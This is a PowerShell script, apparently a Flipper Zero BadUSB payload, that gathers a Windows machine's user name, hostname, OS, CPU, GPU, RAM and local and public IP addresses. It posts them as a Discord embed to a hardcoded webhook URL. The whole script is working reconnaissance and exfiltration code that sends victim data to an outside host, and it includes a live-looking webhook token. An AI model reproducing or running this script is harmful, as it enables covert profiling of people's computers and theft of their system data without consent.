# sysinfo.ps1
# --- Systeminfos einsammeln ---
$u   = whoami
$h   = $env:COMPUTERNAME
$o   = (Get-CimInstance Win32_OperatingSystem).Caption
$cpu = (Get-CimInstance Win32_Processor).Name
$gpu = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB,2)
$lip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    ($_.IPAddress -notlike '169.*') -and ($_.IPAddress -notlike '127.*')
} | Select-Object -First 1).IPAddress
$pip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip

# --- Discord Embed bauen ---
$payload = @{
    username = "FlipperZero"
    embeds   = @(
        @{
            title = "🛰️ Flipper Zero – System Report"
            color = 5814783
            fields = @(
                @{name="👤 User";        value=$u;            inline=$true},
                @{name="🖥️ Hostname";    value=$h;            inline=$true},
                @{name="⚙️ CPU";         value=$cpu;          inline=$false},
                @{name="🎮 GPU";         value=$gpu;          inline=$false},
                @{name="💾 RAM";         value="$ram GB";     inline=$true},
                @{name="📀 OS";          value=$o;            inline=$true},
                @{name="🌐 Local IP";    value=$lip;          inline=$true},
                @{name="🌍 Public IP";   value=$pip;          inline=$true}
            )
        }
    )
}

# --- JSON konvertieren ---
$json = $payload | ConvertTo-Json -Depth 10 -Compress

# --- UTF-8 (ohne BOM) Bytes erzeugen ---
$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($json)

# --- Webhook-URL ---
$webhook = "https://discord.com/api/webhooks/1415429711433044009/UBeb6qyEj9GUE9uh4H0fXslUx6cF23P3zVS1gDJ6RNlQT4E-eASC-_ChDD2pP-9phGvU"

# --- Abschicken ---
Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $utf8Bytes
